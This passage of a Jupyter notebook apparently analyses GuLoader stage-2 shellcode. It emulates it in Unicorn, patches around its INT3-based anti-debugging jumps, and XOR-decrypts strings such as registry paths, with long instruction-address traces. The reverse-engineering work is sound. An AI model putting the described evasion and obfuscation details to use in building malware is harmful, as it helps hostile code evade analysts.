EIP: 0x8a75
EIP: 0x8a77
EIP: 0x8a7d
EIP: 0x8a80
EIP: 0x8a85
EIP: 0x8a8b
EIP: 0x8a8d
EIP: 0x8a90
EIP: 0x8a96
EIP: 0x8a98
EIP: 0x8a9e
EIP: 0x8aa0
EIP: 0x8aa2
EIP: 0x8aa8
EIP: 0x8aae
EIP: 0x8ab4
EIP: 0x8b0e
EIP: 0x8b11
EIP: 0x8b17
EIP: 0x8b19
EIP: 0x8b1f
EIP: 0x8b21
EIP: 0x8b27
EIP: 0x8b2d
EIP: 0x8b30
EIP: 0x8b35
EIP: 0x8b39
EIP: 0x8b3b
EIP: 0x8b40
EIP: 0x8b45
EIP: 0x8b47
EIP: 0x8b4c
EIP: 0x8b4e
EIP: 0x8b54
EIP: 0x8b56
EIP: 0x8b96
EIP: 0x8b9c
EIP: 0x8ba2
EIP: 0x8ba8
EIP: 0x8baa
EIP: 0x8bb0
EIP: 0x8bb2
EIP: 0x8bb5
EIP: 0x8bbb
EIP: 0x8bbd
EIP: 0x8bc3
EIP: 0x8bc9
EIP: 0x8bcc
EIP: 0x8bce
EIP: 0x8bd4
EIP: 0x8bd6
EIP: 0x8bdc
EIP: 0x8be2
EIP: 0x8be8
EIP: 0x8bf2
EIP: 0x8bf4
EIP: 0x8bf7
EIP: 0x8c01
EIP: 0x8c0b
EIP: 0x8c0d
EIP: 0x8c10
EIP: 0x8c1a
EIP: 0x8c1c
EIP: 0x8c1e
EIP: 0x8c1f
EIP: 0x8c25
EIP: 0x8c1e
EIP: 0x8c1f
EIP: 0x8c25
EIP: 0x8c1e
EIP: 0x8c1f
EIP: 0x8c25
EIP: 0x8c27
EIP: 0x8c28
EIP: 0x8c2e
EIP: 0x8c34
EIP: 0x8c36
EIP: 0x8c3c
EIP: 0x8c3e
EIP: 0x8c40
EIP: 0x8c46
EIP: 0x8c4c
EIP: 0x8c56
EIP: 0x8c58
EIP: 0x8c62
EIP: 0x8c6c
EIP: 0x8c6e
EIP: 0x8c78
EIP: 0x8c7b
EIP: 0x8c7e
EIP: 0x8c7f
EIP: 0x8c85
EIP: 0x8c7b
EIP: 0x8c7e
EIP: 0x8c7f
EIP: 0x8c85
EIP: 0x8c7b
EIP: 0x8c7e
EIP: 0x8c7f
EIP: 0x8c85
EIP: 0x8c87
EIP: 0x8c88
EIP: 0x8cda
EIP: 0x8cdc
EIP: 0x8ce2
EIP: 0x8ce3
EIP: 0x8ce5
EIP: 0x8ceb
EIP: 0x8ced
EIP: 0x8cf3
EIP: 0x8cf5
EIP: 0x8cf7
EIP: 0x8cfd
EIP: 0x8d03
EIP: 0x8d0d
EIP: 0x8d0f
EIP: 0x8d19
EIP: 0x8d23
EIP: 0x8d2d
EIP: 0x8d2f
EIP: 0x8d32
EIP: 0x8d33
EIP: 0x8d39
EIP: 0x8d2f
EIP: 0x8d32
EIP: 0x8d33
EIP: 0x8d39
EIP: 0x8d2f
EIP: 0x8d32
EIP: 0x8d33
EIP: 0x8d39
EIP: 0x8d3b
EIP: 0x8d3c
</pre>
</div>
</div>

</div>
</div>

</div>
    

    
    
<div class="cell border-box-sizing code_cell rendered">
<div class="input">

<div class="inner_cell">
    <div class="input_area">
<div class=" highlight hl-ipython3"><pre><span></span><span class="n">arg_buff_data</span> <span class="o">=</span> <span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_read</span><span class="p">(</span><span class="n">ARG_BUFF</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">)</span>

<span class="n">data_len</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s1">'&lt;I'</span><span class="p">,</span> <span class="n">arg_buff_data</span><span class="p">[:</span><span class="mi">4</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">arg_buff_data</span><span class="p">[</span><span class="mi">4</span><span class="p">:</span><span class="mi">4</span><span class="o">+</span><span class="n">data_len</span><span class="p">]</span>
<span class="nb">print</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</pre></div>

    </div>
</div>
</div>

<div class="output_wrapper">
<div class="output">

<div class="output_area">

<div class="output_subarea output_stream output_stdout output_text">
<pre>bytearray(b'n\x00M9\xd3\x1e\n\x8e\xa4\xc5&gt;\xea\xf76\xf5t \x07g\xcd')
</pre>
</div>
</div>

</div>
</div>

</div>
    

    
    
<div class="cell border-box-sizing code_cell rendered">
<div class="input">

<div class="inner_cell">
    <div class="input_area">
<div class=" highlight hl-ipython3"><pre><span></span><span class="n">xor_crypt</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
</pre></div>

    </div>
</div>
</div>

<div class="output_wrapper">
<div class="output">

<div class="output_area">



<div class="output_text output_subarea output_execute_result">
<pre>b'SOFTWARE\\AppDataLow\\'</pre>
</div>

</div>

</div>
</div>

</div>
    

    
    
<div class="cell border-box-sizing code_cell rendered">
<div class="input">

<div class="inner_cell">
    <div class="input_area">
<div class=" highlight hl-ipython3"><pre><span></span><span class="kn">from</span> <span class="nn">ctypes</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">unicorn</span> <span class="k">as</span> <span class="nn">uc</span>
<span class="kn">import</span> <span class="nn">struct</span>

<span class="c1"># This is just to print each instruction address as it's emulated</span>
<span class="k">def</span> <span class="nf">hook_call</span><span class="p">(</span><span class="n">uc_engine</span><span class="p">,</span> <span class="n">mem_type</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
    <span class="n">eip</span> <span class="o">=</span> <span class="n">uc_engine</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">uc</span><span class="o">.</span><span class="n">x86_const</span><span class="o">.</span><span class="n">UC_X86_REG_EIP</span><span class="p">)</span>
    <span class="n">pretty_eip</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">eip</span><span class="o">-</span><span class="mh">0x10000</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"EIP: </span><span class="si">{</span><span class="n">pretty_eip</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
    <span class="n">test</span> <span class="o">=</span> <span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_read</span><span class="p">(</span><span class="n">eip</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">test</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0xcc</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Breakpoint detected at </span><span class="si">{</span><span class="n">pretty_eip</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
        <span class="n">new_eip</span> <span class="o">=</span> <span class="p">(</span><span class="n">test</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">^</span> <span class="mh">0x8F</span><span class="p">)</span> <span class="o">+</span> <span class="n">eip</span>
        <span class="n">uc_engine</span><span class="o">.</span><span class="n">reg_write</span><span class="p">(</span><span class="n">uc</span><span class="o">.</span><span class="n">x86_const</span><span class="o">.</span><span class="n">UC_X86_REG_EIP</span><span class="p">,</span> <span class="n">new_eip</span><span class="p">)</span>
    <span class="k">return</span> <span class="kc">True</span>

<span class="n">buf</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">'/tmp/Guloader_stage_2.bin'</span><span class="p">,</span> <span class="s1">'rb'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>

<span class="n">uc_engine</span> <span class="o">=</span> <span class="n">uc</span><span class="o">.</span><span class="n">Uc</span><span class="p">(</span><span class="n">uc</span><span class="o">.</span><span class="n">UC_ARCH_X86</span><span class="p">,</span> <span class="n">uc</span><span class="o">.</span><span class="n">UC_MODE_32</span><span class="p">)</span>
<span class="n">STACK_ADDR</span> <span class="o">=</span> <span class="mh">0x900000</span>
<span class="n">CODE_ADDR</span> <span class="o">=</span> <span class="mh">0x10000</span>

<span class="c1"># Load shellcode into mem</span>
<span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_map</span><span class="p">(</span><span class="n">CODE_ADDR</span><span class="p">,</span> <span class="mh">0x300000</span><span class="p">,</span> <span class="n">uc</span><span class="o">.</span><span class="n">UC_PROT_ALL</span><span class="p">)</span>
<span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">CODE_ADDR</span><span class="p">,</span> <span class="n">buf</span><span class="p">)</span>

<span class="c1"># Set shellcode entrypoint</span>
<span class="n">uc_engine</span><span class="o">.</span><span class="n">reg_write</span><span class="p">(</span><span class="n">uc</span><span class="o">.</span><span class="n">x86_const</span><span class="o">.</span><span class="n">UC_X86_REG_EIP</span><span class="p">,</span> <span class="n">CODE_ADDR</span><span class="p">)</span>

<span class="c1"># Setup the stack memory</span>
<span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_map</span><span class="p">(</span><span class="n">STACK_ADDR</span> <span class="o">-</span> <span class="mh">0x100000</span><span class="p">,</span> <span class="mh">0x200000</span><span class="p">,</span> <span class="n">uc</span><span class="o">.</span><span class="n">UC_PROT_ALL</span><span class="p">)</span>
<span class="n">uc_engine</span><span class="o">.</span><span class="n">reg_write</span><span class="p">(</span><span class="n">uc</span><span class="o">.</span><span class="n">x86_const</span><span class="o">.</span><span class="n">UC_X86_REG_ESP</span><span class="p">,</span> <span class="n">STACK_ADDR</span><span class="p">)</span>
<span class="n">uc_engine</span><span class="o">.</span><span class="n">reg_write</span><span class="p">(</span><span class="n">uc</span><span class="o">.</span><span class="n">x86_const</span><span class="o">.</span><span class="n">UC_X86_REG_EBP</span><span class="p">,</span> <span class="n">STACK_ADDR</span><span class="p">)</span>


<span class="c1"># This is our hook just for fun</span>
<span class="n">hook1</span> <span class="o">=</span> <span class="n">uc_engine</span><span class="o">.</span><span class="n">hook_add</span><span class="p">(</span><span class="n">uc</span><span class="o">.</span><span class="n">UC_HOOK_CODE</span><span class="p">,</span> <span class="n">hook_call</span><span class="p">,</span> <span class="kc">None</span><span class="p">)</span>


<span class="c1"># Setup our arguments/buffers</span>

<span class="n">EAX_BUFF</span> <span class="o">=</span> <span class="mh">0x500000</span>
<span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_map</span><span class="p">(</span><span class="n">EAX_BUFF</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">uc</span><span class="o">.</span><span class="n">UC_PROT_ALL</span><span class="p">)</span>
<span class="n">uc_engine</span><span class="o">.</span><span class="n">reg_write</span><span class="p">(</span><span class="n">uc</span><span class="o">.</span><span class="n">x86_const</span><span class="o">.</span><span class="n">UC_X86_REG_EAX</span><span class="p">,</span> <span class="n">EAX_BUFF</span><span class="p">)</span>

<span class="c1"># This sort of works like a 'push' to push the buffer address onto the stack</span>
<span class="n">EBP_BUFF</span> <span class="o">=</span> <span class="mh">0x600000</span>
<span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_map</span><span class="p">(</span><span class="n">EBP_BUFF</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">uc</span><span class="o">.</span><span class="n">UC_PROT_ALL</span><span class="p">)</span>
<span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">STACK_ADDR</span><span class="p">,</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;I'</span><span class="p">,</span><span class="n">EBP_BUFF</span><span class="p">))</span>


<span class="n">EDI_BUFF</span> <span class="o">=</span> <span class="mh">0x700000</span>
<span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_map</span><span class="p">(</span><span class="n">EDI_BUFF</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">uc</span><span class="o">.</span><span class="n">UC_PROT_ALL</span><span class="p">)</span>
<span class="n">uc_engine</span><span class="o">.</span><span class="n">reg_write</span><span class="p">(</span><span class="n">uc</span><span class="o">.</span><span class="n">x86_const</span><span class="o">.</span><span class="n">UC_X86_REG_EDI</span><span class="p">,</span> <span class="n">EDI_BUFF</span><span class="p">)</span>


<span class="n">ARG_BUFF</span> <span class="o">=</span> <span class="mh">0x400000</span>
<span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_map</span><span class="p">(</span><span class="n">ARG_BUFF</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">uc</span><span class="o">.</span><span class="n">UC_PROT_ALL</span><span class="p">)</span>
<span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">STACK_ADDR</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;I'</span><span class="p">,</span><span class="n">ARG_BUFF</span><span class="p">))</span>

<span class="n">FN_START</span> <span class="o">=</span> <span class="mh">0x00017571</span>  <span class="o">+</span> <span class="n">CODE_ADDR</span>
<span class="n">FN_END</span> <span class="o">=</span> <span class="mh">0x0017A11</span> <span class="o">+</span> <span class="n">CODE_ADDR</span>

<span class="n">uc_engine</span><span class="o">.</span><span class="n">emu_start</span><span class="p">(</span><span class="n">FN_START</span><span class="p">,</span> <span class="n">FN_END</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>

<span class="c1">#out_eip = uc_engine.reg_read(uc.x86_const.UC_X86_REG_EIP)</span>
</pre></div>

    </div>
</div>
</div>

<div class="output_wrapper">
<div class="output">

<div class="output_area">

<div class="output_subarea output_stream output_stdout output_text">
<pre>EIP: 0x17571
Breakpoint detected at 0x17571
EIP: 0x17580
EIP: 0x17584
Breakpoint detected at 0x17584
EIP: 0x1758d
EIP: 0x17593
Breakpoint detected at 0x17593
EIP: 0x17598
EIP: 0x1759e
Breakpoint detected at 0x1759e
EIP: 0x175a4
EIP: 0x175aa
Breakpoint detected at 0x175aa
EIP: 0x175ae
EIP: 0x175b4
Breakpoint detected at 0x175b4
EIP: 0x175c3
EIP: 0x175cd
EIP: 0x175d7
Breakpoint detected at 0x175d7
EIP: 0x175e8
Breakpoint detected at 0x175e8
EIP: 0x175fc
EIP: 0x17606
EIP: 0x17610
Breakpoint detected at 0x17610
EIP: 0x17617
Breakpoint detected at 0x17617
EIP: 0x1761d
EIP: 0x1761e
EIP: 0x17624
EIP: 0x17617
Breakpoint detected at 0x17617
EIP: 0x1761d
EIP: 0x1761e
EIP: 0x17624
EIP: 0x17617
Breakpoint detected at 0x17617
EIP: 0x1761d
EIP: 0x1761e
EIP: 0x17624
EIP: 0x17626
Breakpoint detected at 0x17626
EIP: 0x17634
EIP: 0x17635
Breakpoint detected at 0x17635
EIP: 0x17641
EIP: 0x17647
Breakpoint detected at 0x17647
EIP: 0x17653
EIP: 0x17659
Breakpoint detected at 0x17659
EIP: 0x17661
Breakpoint detected at 0x17661
EIP: 0x17665
EIP: 0x1766b
EIP: 0x17671
Breakpoint detected at 0x17671
EIP: 0x17678
Breakpoint detected at 0x17678
EIP: 0x17686
Breakpoint detected at 0x17686
EIP: 0x1768e
EIP: 0x17694
Breakpoint detected at 0x17694
EIP: 0x176a2
EIP: 0x176a7
Breakpoint detected at 0x176a7
EIP: 0x176ad
EIP: 0x176b3
Breakpoint detected at 0x176b3
EIP: 0x176c1
EIP: 0x176c7
Breakpoint detected at 0x176c7
EIP: 0x176db
EIP: 0x176e1
EIP: 0x1772b
Breakpoint detected at 0x1772b
EIP: 0x17734
EIP: 0x17736
EIP: 0x1773c
Breakpoint detected at 0x1773c
EIP: 0x17744
Breakpoint detected at 0x17744
EIP: 0x1774e
EIP: 0x17754
Breakpoint detected at 0x17754
EIP: 0x1775e
EIP: 0x17764
Breakpoint detected at 0x17764
EIP: 0x17775
EIP: 0x1777b
EIP: 0x17781
Breakpoint detected at 0x17781
EIP: 0x17785
EIP: 0x1778f
Breakpoint detected at 0x1778f
EIP: 0x17798
EIP: 0x177a2
Breakpoint detected at 0x177a2
EIP: 0x177b4
EIP: 0x177be
EIP: 0x177c8
EIP: 0x177c9
EIP: 0x177cf
EIP: 0x177c8
EIP: 0x177c9
EIP: 0x177cf
EIP: 0x177c8
EIP: 0x177c9
EIP: 0x177cf
EIP: 0x177d1
Breakpoint detected at 0x177d1
EIP: 0x177e6
EIP: 0x177e7
Breakpoint detected at 0x177e7
EIP: 0x177f5
Breakpoint detected at 0x177f5
EIP: 0x17809
EIP: 0x1780f
Breakpoint detected at 0x1780f
EIP: 0x1781e
Breakpoint detected at 0x1781e
EIP: 0x1782e
EIP: 0x17834
Breakpoint detected at 0x17834
EIP: 0x17840
EIP: 0x17846
Breakpoint detected at 0x17846
EIP: 0x1784b
Breakpoint detected at 0x1784b
EIP: 0x1785c
EIP: 0x17862
Breakpoint detected at 0x17862
EIP: 0x17871
Breakpoint detected at 0x17871
EIP: 0x1787a
EIP: 0x17884
Breakpoint detected at 0x17884
EIP: 0x17897
EIP: 0x178a1
Breakpoint detected at 0x178a1
EIP: 0x178aa
EIP: 0x178b4
Breakpoint detected at 0x178b4
EIP: 0x178c7
EIP: 0x178d1
Breakpoint detected at 0x178d1
EIP: 0x178e6
Breakpoint detected at 0x178e6
EIP: 0x178ef
Breakpoint detected at 0x178ef
EIP: 0x17903
Breakpoint detected at 0x17903
EIP: 0x17911
EIP: 0x17912
EIP: 0x17918
EIP: 0x17903
Breakpoint detected at 0x17903
EIP: 0x17911
EIP: 0x17912
EIP: 0x17918
EIP: 0x17903
Breakpoint detected at 0x17903
EIP: 0x17911
EIP: 0x17912
EIP: 0x17918
EIP: 0x1791a
Breakpoint detected at 0x1791a
EIP: 0x1792d
EIP: 0x1792e
Breakpoint detected at 0x1792e
EIP: 0x1793b
Breakpoint detected at 0x1793b
EIP: 0x17949
EIP: 0x1794f
Breakpoint detected at 0x1794f
EIP: 0x1795f
EIP: 0x17965
Breakpoint detected at 0x17965
EIP: 0x1797a
Breakpoint detected at 0x1797a
EIP: 0x17986
EIP: 0x1798c
Breakpoint detected at 0x1798c
EIP: 0x1799d
EIP: 0x179a3
Breakpoint detected at 0x179a3
EIP: 0x179af
EIP: 0x179b5
EIP: 0x179ba
EIP: 0x179c0
EIP: 0x179c6
Breakpoint detected at 0x179c6
EIP: 0x179d8
EIP: 0x179de
Breakpoint detected at 0x179de
EIP: 0x179e7
Breakpoint detected at 0x179e7
EIP: 0x179ee
EIP: 0x179f0
EIP: 0x179f6
Breakpoint detected at 0x179f6
EIP: 0x17a02
Breakpoint detected at 0x17a02
</pre>
</div>
</div>

</div>
</div>

</div>
    

    
    
<div class="cell border-box-sizing code_cell rendered">
<div class="input">

<div class="inner_cell">
    <div class="input_area">
<div class=" highlight hl-ipython3"><pre><span></span><span class="n">arg_buff_data</span> <span class="o">=</span> <span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_read</span><span class="p">(</span><span class="n">ARG_BUFF</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">)</span>

<span class="n">data_len</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s1">'&lt;I'</span><span class="p">,</span> <span class="n">arg_buff_data</span><span class="p">[:</span><span class="mi">4</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">arg_buff_data</span><span class="p">[</span><span class="mi">4</span><span class="p">:</span><span class="mi">4</span><span class="o">+</span><span class="n">data_len</span><span class="p">]</span>
<span class="n">xor_crypt</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">'utf-16'</span><span class="p">)</span>
</pre></div>

    </div>
</div>
</div>

<div class="output_wrapper">
<div class="output">

<div class="output_area">



<div class="output_text output_subarea output_execute_result">
<pre>'windir='</pre>
</div>

</div>

</div>
</div>

</div>
    

<div class="cell border-box-sizing text_cell rendered">
<div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h4 id="New-and-Improved-Hook-(Only-for-INT)">
<a class="anchor" href="#New-and-Improved-Hook-(Only-for-INT)" aria-hidden="true"><span class="octicon octicon-link"></span></a>New and Improved Hook (Only for INT)<a class="anchor-link" href="#New-and-Improved-Hook-(Only-for-INT)"> </a>
</h4>
</div>
</div>
</div>
    
    
<div class="cell border-box-sizing code_cell rendered">
<div class="input">

<div class="inner_cell">
    <div class="input_area">
<div class=" highlight hl-ipython3"><pre><span></span><span class="kn">from</span> <span class="nn">ctypes</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">unicorn</span> <span class="k">as</span> <span class="nn">uc</span>
<span class="kn">import</span> <span class="nn">struct</span>

<span class="c1"># This is just to print each instruction address as it's emulated</span>
<span class="k">def</span> <span class="nf">hook_int</span><span class="p">(</span><span class="n">uc_engine</span><span class="p">,</span> <span class="n">interrupt_number</span><span class="p">,</span> <span class="n">userdata</span><span class="p">):</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"INT </span><span class="si">{</span><span class="n">interrupt_number</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
    <span class="n">eip</span> <span class="o">=</span> <span class="n">uc_engine</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">uc</span><span class="o">.</span><span class="n">x86_const</span><span class="o">.</span><span class="n">UC_X86_REG_EIP</span><span class="p">)</span> <span class="o">-</span><span class="mi">1</span>
    <span class="n">pretty_eip</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">eip</span><span class="o">-</span><span class="mh">0x10000</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"EIP: </span><span class="si">{</span><span class="n">pretty_eip</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
    <span class="n">test</span> <span class="o">=</span> <span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_read</span><span class="p">(</span><span class="n">eip</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">test</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0xcc</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Breakpoint detected at </span><span class="si">{</span><span class="n">pretty_eip</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
        <span class="n">new_eip</span> <span class="o">=</span> <span class="p">(</span><span class="n">test</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">^</span> <span class="mh">0x8F</span><span class="p">)</span> <span class="o">+</span> <span class="n">eip</span>
        <span class="n">uc_engine</span><span class="o">.</span><span class="n">reg_write</span><span class="p">(</span><span class="n">uc</span><span class="o">.</span><span class="n">x86_const</span><span class="o">.</span><span class="n">UC_X86_REG_EIP</span><span class="p">,</span> <span class="n">new_eip</span><span class="p">)</span>
    <span class="k">return</span> <span class="kc">True</span>

<span class="n">buf</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">'/tmp/Guloader_stage_2.bin'</span><span class="p">,</span> <span class="s1">'rb'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>

<span class="n">uc_engine</span> <span class="o">=</span> <span class="n">uc</span><span class="o">.</span><span class="n">Uc</span><span class="p">(</span><span class="n">uc</span><span class="o">.</span><span class="n">UC_ARCH_X86</span><span class="p">,</span> <span class="n">uc</span><span class="o">.</span><span class="n">UC_MODE_32</span><span class="p">)</span>
<span class="n">STACK_ADDR</span> <span class="o">=</span> <span class="mh">0x900000</span>
<span class="n">CODE_ADDR</span> <span class="o">=</span> <span class="mh">0x10000</span>

<span class="c1"># Load shellcode into mem</span>
<span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_map</span><span class="p">(</span><span class="n">CODE_ADDR</span><span class="p">,</span> <span class="mh">0x300000</span><span class="p">,</span> <span class="n">uc</span><span class="o">.</span><span class="n">UC_PROT_ALL</span><span class="p">)</span>
<span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">CODE_ADDR</span><span class="p">,</span> <span class="n">buf</span><span class="p">)</span>

<span class="c1"># Set shellcode entrypoint</span>
<span class="n">uc_engine</span><span class="o">.</span><span class="n">reg_write</span><span class="p">(</span><span class="n">uc</span><span class="o">.</span><span class="n">x86_const</span><span class="o">.</span><span class="n">UC_X86_REG_EIP</span><span class="p">,</span> <span class="n">CODE_ADDR</span><span class="p">)</span>

<span class="c1"># Setup the stack memory</span>
<span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_map</span><span class="p">(</span><span class="n">STACK_ADDR</span> <span class="o">-</span> <span class="mh">0x100000</span><span class="p">,</span> <span class="mh">0x200000</span><span class="p">,</span> <span class="n">uc</span><span class="o">.</span><span class="n">UC_PROT_ALL</span><span class="p">)</span>
<span class="n">uc_engine</span><span class="o">.</span><span class="n">reg_write</span><span class="p">(</span><span class="n">uc</span><span class="o">.</span><span class="n">x86_const</span><span class="o">.</span><span class="n">UC_X86_REG_ESP</span><span class="p">,</span> <span class="n">STACK_ADDR</span><span class="p">)</span>
<span class="n">uc_engine</span><span class="o">.</span><span class="n">reg_write</span><span class="p">(</span><span class="n">uc</span><span class="o">.</span><span class="n">x86_const</span><span class="o">.</span><span class="n">UC_X86_REG_EBP</span><span class="p">,</span> <span class="n">STACK_ADDR</span><span class="p">)</span>


<span class="c1"># This is our hook just for fun</span>
<span class="n">hook1</span> <span class="o">=</span> <span class="n">uc_engine</span><span class="o">.</span><span class="n">hook_add</span><span class="p">(</span><span class="n">uc</span><span class="o">.</span><span class="n">UC_HOOK_INTR</span><span class="p">,</span> <span class="n">hook_int</span><span class="p">,</span> <span class="kc">None</span><span class="p">)</span>

<span class="c1"># Setup our arguments/buffers</span>

<span class="n">EAX_BUFF</span> <span class="o">=</span> <span class="mh">0x500000</span>
<span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_map</span><span class="p">(</span><span class="n">EAX_BUFF</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">uc</span><span class="o">.</span><span class="n">UC_PROT_ALL</span><span class="p">)</span>
<span class="n">uc_engine</span><span class="o">.</span><span class="n">reg_write</span><span class="p">(</span><span class="n">uc</span><span class="o">.</span><span class="n">x86_const</span><span class="o">.</span><span class="n">UC_X86_REG_EAX</span><span class="p">,</span> <span class="n">EAX_BUFF</span><span class="p">)</span>

<span class="c1"># This sort of works like a 'push' to push the buffer address onto the stack</span>
<span class="n">EBP_BUFF</span> <span class="o">=</span> <span class="mh">0x600000</span>
<span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_map</span><span class="p">(</span><span class="n">EBP_BUFF</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">uc</span><span class="o">.</span><span class="n">UC_PROT_ALL</span><span class="p">)</span>
<span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">STACK_ADDR</span><span class="p">,</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;I'</span><span class="p">,</span><span class="n">EBP_BUFF</span><span class="p">))</span>


<span class="n">EDI_BUFF</span> <span class="o">=</span> <span class="mh">0x700000</span>
<span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_map</span><span class="p">(</span><span class="n">EDI_BUFF</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">uc</span><span class="o">.</span><span class="n">UC_PROT_ALL</span><span class="p">)</span>
<span class="n">uc_engine</span><span class="o">.</span><span class="n">reg_write</span><span class="p">(</span><span class="n">uc</span><span class="o">.</span><span class="n">x86_const</span><span class="o">.</span><span class="n">UC_X86_REG_EDI</span><span class="p">,</span> <span class="n">EDI_BUFF</span><span class="p">)</span>


<span class="n">ARG_BUFF</span> <span class="o">=</span> <span class="mh">0x400000</span>
<span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_map</span><span class="p">(</span><span class="n">ARG_BUFF</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">uc</span><span class="o">.</span><span class="n">UC_PROT_ALL</span><span class="p">)</span>
<span class="n">uc_engine</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">STACK_ADDR</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;I'</span><span class="p">,</span><span class="n">ARG_BUFF</span><span class="p">))</span>

<span class="n">FN_START</span> <span class="o">=</span> <span class="mh">0x00017571</span>  <span class="o">+</span> <span class="n">CODE_ADDR</span>
<span class="n">FN_END</span> <span class="o">=</span> <span class="mh">0x0017A11</span> <span class="o">+</span> <span class="n">CODE_ADDR</span>

<span class="n">uc_engine</span><span class="o">.</span><span class="n">emu_start</span><span class="p">(</span><span class="n">FN_START</span><span class="p">,</span> <span class="n">FN_END</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>

<span class="c1">#out_eip = uc_engine.reg_read(uc.x86_const.UC_X86_REG_EIP)</span>
</pre></div>

    </div>
</div>
</div>

<div class="output_wrapper">
<div class="output">

<div class="output_area">

<div class="output_subarea output_stream output_stdout output_text">
<pre>INT 3
EIP: 0x17571
Breakpoint detected at 0x17571
INT 3
EIP: 0x17584
Breakpoint detected at 0x17584
INT 3
EIP: 0x17593
Breakpoint detected at 0x17593
INT 3
EIP: 0x1759e
